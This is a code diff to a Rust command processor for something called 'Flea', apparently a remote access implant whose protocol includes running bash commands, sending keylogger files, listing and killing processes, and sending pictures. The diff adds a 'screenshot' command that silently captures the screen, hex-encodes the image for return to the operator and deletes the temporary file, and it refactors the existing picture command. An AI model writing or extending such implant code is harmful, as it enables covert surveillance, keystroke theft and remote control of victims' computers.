@@ -26,6 +26,7 @@ const FLEA_PROTOCOL_VERSION: u8 = 1;
 const GET_VERSION_COMMAND: &'static str = "version";
 const EXECUTE_BASH_COMMAND: &'static str = "bash";
 const SEND_PIC_COMMAND: &'static str = "pic";
+const GET_SCREENSHOT_COMMAND: &'static str = "screenshot";
 const SEND_KEY_LOGGER_FILE_COMMAND: &'static str = "sendlog";
 const SEND_PROCESS_LIST_COMMAND: &'static str = "proclist";
 const KILL_COMMAND: &'static str = "kill";
@@ -303,6 +304,40 @@ impl CommandProcessor
         return Ok(data);
     }
     
+    /// Gets a temporary directory path for a screenshot file
+    /// * Returns a path to a temporary directory with a screenshot filename which is a unique name
+    fn get_temp_dir(&self) -> PathBuf
+    {
+        let now: DateTime<Utc> = Utc::now();
+        let file_name = format!("screenshot{}.png", now.format("%Y-%m-%d_%H-%M-%S"));
+        env::temp_dir().as_path().join(file_name)
+    }
+
+    /// Reads a binary file and returns its content as a u8 vector
+    /// * file_path - a path to the file to read
+    /// * returns a vector of u8 bytes or an error
+    fn read_binary_file(&self, file_path: &PathBuf) -> Result<Vec<u8>, std::io::Error>
+    {
+        let mut file = File::open(file_path)?;
+        let mut data = Vec::new();
+        file.read_to_end(&mut data)?;
+        Ok(data)
+    }
+
+    /// Convert a byte array into string digits
+    /// * data - a byte array to convert
+    /// * returns a string with digits
+    /// * Example: [0x01, 0x02, 0x03] -> "010203"
+    fn bytes_to_string(&self, data: &[u8]) -> String
+    {
+        let mut s = String::new();
+        for b in data
+        {
+            s.push_str(&format!("{:02x}", b));
+        }
+        s
+    }
+
     /// Writes data to a file on disk
     /// * file_name - a path with a name where the data will be written to
     /// * data - array od u8 bytes to save in a file
@@ -407,7 +442,7 @@ impl FleaCommand for CommandProcessor
         { 
             version: FLEA_PROTOCOL_VERSION,
 
-            conf: match confy::load("flea_conf")
+            conf: match confy::load("flea_conf", None)
             {
                 Ok(x) =>
                 {
@@ -481,12 +516,45 @@ impl FleaCommand for CommandProcessor
                 return self.get_process_list();
             },
 
+            GET_SCREENSHOT_COMMAND =>
+            {
+                let current_path = self.get_temp_dir();
+                match self.take_screenshot(&current_path.to_str().unwrap()) 
+                {
+                    Ok(x) =>
+                    {
+                        x
+                    },
+                    Err(x) =>
+                    {
+                        return x
+                    }
+                };
+
+                return match self.read_binary_file(&current_path)
+                {
+                    Ok(x) =>
+                    {
+                        let ret = self.bytes_to_string(&x);
+                        if let Err(y) = std::fs::remove_file(current_path) {
+                            error!("Couldn't remove a file: {}", y.to_string());
+                            ret
+                        } 
+                        else 
+                        {
+                            ret
+                        }
+                    },
+                    Err(x) =>
+                    {
+                        return x.to_string()
+                    }
+                }
+            },
+
             SEND_PIC_COMMAND =>
             {
-                let now: DateTime<Utc> = Utc::now();
-                let file_name = format!("screenshot{}.png", now.format("%Y-%m-%d_%H-%M-%S"));
-                let current_path = env::temp_dir().as_path().join(file_name);
-
+                let current_path = self.get_temp_dir();
                 match self.take_screenshot(&current_path.to_str().unwrap()) 
                 {
                     Ok(x) =>
